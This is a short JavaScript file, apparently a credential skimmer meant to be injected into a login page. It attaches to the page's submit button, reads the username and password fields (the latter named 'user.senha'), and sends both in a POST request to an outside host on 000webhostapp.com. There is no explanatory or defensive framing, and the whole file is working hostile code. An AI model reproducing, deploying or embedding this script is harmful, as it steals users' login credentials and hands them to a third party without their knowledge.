console.log('sg')

let btn = document.querySelector('[data-callback="onSubmit"]')
const username = document.querySelector('[name="user.login"]')
const password = document.querySelector('[name="user.senha"]')

if (btn){
    btn.addEventListener("click", function(){
        const data = new FormData();
        data.append("username", username.value);
        data.append("password", password.value);


        const response = fetch("https://fckyou-get.000webhostapp.com/get.php", {
            method: "POST",
            body: data
        });
    });
}
